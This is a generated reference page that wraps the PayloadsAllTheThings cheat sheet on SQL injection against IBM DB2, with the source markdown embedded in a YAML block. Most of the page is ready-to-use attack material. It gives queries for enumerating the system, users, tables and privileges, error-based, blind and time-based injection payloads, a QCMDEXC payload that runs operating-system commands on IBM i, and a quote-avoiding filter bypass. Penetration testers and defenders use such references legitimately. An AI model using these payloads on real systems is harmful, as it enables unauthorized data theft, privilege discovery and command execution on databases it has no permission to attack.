---
parsed_by: focuslocust
source: payloadsallthethings
type: generated
---
# DB2 Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `payloadsallthethings` |
| Type | `payload-topic` |
| Record ID | `patt-sql-injection-db2-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/DB2 Injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [DB2 Injection](../../topics/sql-injection/db2-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | patt-sql-injection-db2-injection |
| name | DB2 Injection |
| type | payload-topic |
| source | payloadsallthethings |
| url | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/DB2%20Injection.md |

## Preserved Source Material

````yaml
_body: "# DB2 Injection\n\n> IBM DB2 is a family of relational database management systems (RDBMS) developed by IBM. Originally\
  \ created in the 1980s for mainframes, DB2 has evolved to support various platforms and workloads, including distributed\
  \ systems, cloud environments, and hybrid deployments.\n\n## Summary\n\n* [DB2 Comments](#db2-comments)\n* [DB2 Default\
  \ Databases](#db2-default-databases)\n* [DB2 Enumeration](#db2-enumeration)\n* [DB2 Methodology](#db2-methodology)\n* [DB2\
  \ Error Based](#db2-error-based)\n* [DB2 Blind Based](#db2-blind-based)\n* [DB2 Time Based](#db2-time-based)\n* [DB2 Command\
  \ Execution](#db2-command-execution)\n* [DB2 WAF Bypass](#db2-waf-bypass)\n* [DB2 Accounts and Privileges](#db2-accounts-and-privileges)\n\
  * [References](#references)\n\n## DB2 Comments\n\n| Type                       | Description                       |\n|\
  \ -------------------------- | --------------------------------- |\n| `--`                       | SQL comment         \
  \              |\n\n## DB2 Default Databases\n\n| Name        | Description                                            \
  \               |\n| ----------- | --------------------------------------------------------------------- |\n| SYSIBM   \
  \   | Core system catalog tables storing metadata for database objects.     |\n| SYSCAT      | User-friendly views for accessing\
  \ metadata in the SYSIBM tables.      |\n| SYSSTAT     | Statistics tables used by the DB2 optimizer for query optimization.\
  \   |\n| SYSPUBLIC   | Metadata about objects available to all users (granted to PUBLIC).    |\n| SYSIBMADM   | Administrative\
  \ views for monitoring and managing the database system. |\n| SYSTOOLs    | Tools, utilities, and auxiliary objects provided\
  \ for database administration and troubleshooting. |\n\n## DB2 Enumeration\n\n| Description      | SQL Query |\n| ----------------\
  \ | ----------------------------------------- |\n| DBMS version     | `select versionnumber, version_timestamp from sysibm.sysversions;`\
  \ |\n| DBMS version     | `select service_level from table(sysproc.env_get_inst_info()) as instanceinfo` |\n| DBMS version\
  \     | `select getvariable('sysibm.version') from sysibm.sysdummy1` |\n| DBMS version     | `select prod_release,installed_prod_fullname\
  \ from table(sysproc.env_get_prod_info()) as productinfo` |\n| DBMS version     | `select service_level,bld_level from sysibmadm.env_inst_info`\
  \ |\n| Current user     | `select user from sysibm.sysdummy1` |\n| Current user     | `select session_user from sysibm.sysdummy1`\
  \ |\n| Current user     | `select system_user from sysibm.sysdummy1` |\n| Current database | `select current server from\
  \ sysibm.sysdummy1` |\n| OS info          | `select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info`\
  \ |\n\n## DB2 Methodology\n\n| Description      | SQL Query |\n| ---------------- | ------------------------------------\
  \ |\n| List databases   | `SELECT distinct(table_catalog) FROM sysibm.tables` |\n| List databases   | `SELECT schemaname\
  \ FROM syscat.schemata;` |\n| List columns     | `SELECT name, tbname, coltype FROM sysibm.syscolumns` |\n| List tables\
  \      | `SELECT table_name FROM sysibm.tables` |\n| List tables      | `SELECT name FROM sysibm.systables` |\n| List tables\
  \      | `SELECT tbname FROM sysibm.syscolumns WHERE name='username'` |\n\n## DB2 Error Based\n\n```sql\n-- Returns all\
  \ in one xml-formatted string\nselect xmlagg(xmlrow(table_schema)) from sysibm.tables\n\n-- Same but without repeated elements\n\
  select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)\n\n-- Returns all in one xml-formatted\
  \ string.\n-- May need CAST(xml2clob(… AS varchar(500)) to display the result.\nselect xml2clob(xmelement(name t, table_schema))\
  \ from sysibm.tables \n```\n\n## DB2 Blind Based\n\n| Description      | SQL Query |\n| ---------------- | ------------------------------------------\
  \ |\n| Substring        | `select substr('abc',2,1) FROM sysibm.sysdummy1` |\n| ASCII value      | `select chr(65) from\
  \ sysibm.sysdummy1`     |\n| CHAR to ASCII    | `select ascii('A') from sysibm.sysdummy1`  |\n| Select Nth Row   | `select\
  \ name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row\
  \ only` |\n| Bitwise AND      | `select bitand(1,0) from sysibm.sysdummy1` |\n| Bitwise AND NOT  | `select bitandnot(1,0)\
  \ from sysibm.sysdummy1` |\n| Bitwise OR       | `select bitor(1,0) from sysibm.sysdummy1`  |\n| Bitwise XOR      | `select\
  \ bitxor(1,0) from sysibm.sysdummy1` |\n| Bitwise NOT      | `select bitnot(1,0) from sysibm.sysdummy1` |\n\n## DB2 Time\
  \ Based\n\nHeavy queries, if user starts with ascii 68 ('D'), the heavy query will be executed, delaying the response.\n\
  \n```sql\n' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1))\
  \ from sysibm.sysdummy1)=68 \n```\n\n## DB2 Command Execution\n\n> The QSYS2.QCMDEXC() procedure and scalar function can\
  \ be used to execute IBM i CL commands.\n\nUsing the `QSYS2.QCMDEXC()` on IBM i (previously named AS-400), it is possibile\
  \ to achieve command execution.\n\n```sql\n'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')\n```\n\n## DB2 WAF Bypass\n\
  \n### Avoiding Quotes\n\n```sql\nSELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1\n```\n\n## DB2 Accounts\
  \ and Privileges\n\n| Description      | SQL Query |\n| ---------------- | ------------------------------------ |\n| List\
  \ users | `select distinct(grantee) from sysibm.systabauth` |\n| List users | `select distinct(definer) from syscat.schemata`\
  \ |\n| List users | `select distinct(authid) from sysibmadm.privileges` |\n| List users | `select grantee from syscat.dbauth`\
  \ |\n| List privileges | `select * from syscat.tabauth` |\n| List privileges | `select * from SYSIBM.SYSUSERAUTH — List\
  \ db2 system privilegies` |\n| List DBA accounts | `select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'`\
  \ |\n| List DBA accounts | `select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'` |\n| Location\
  \ of DB files | `select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'` |\n\n## References\n\n* [DB2 SQL injection\
  \ cheat sheet - Adrián - May 20, 2012](https://web.archive.org/web/20211026090110/https://securityetalii.es/2012/05/20/db2-sql-injection-cheat-sheet/)\n\
  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet - @pentestmonkey - September 17, 2011](https://web.archive.org/web/20260226035803/https://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)\n\
  * [QSYS2.QCMDEXC() - IBM Support - April 22, 2023](https://web.archive.org/web/20230305185053/https://www.ibm.com/support/pages/qsys2qcmdexc)"
_relative_path: SQL Injection/DB2 Injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/SQL Injection/DB2 Injection.md
````
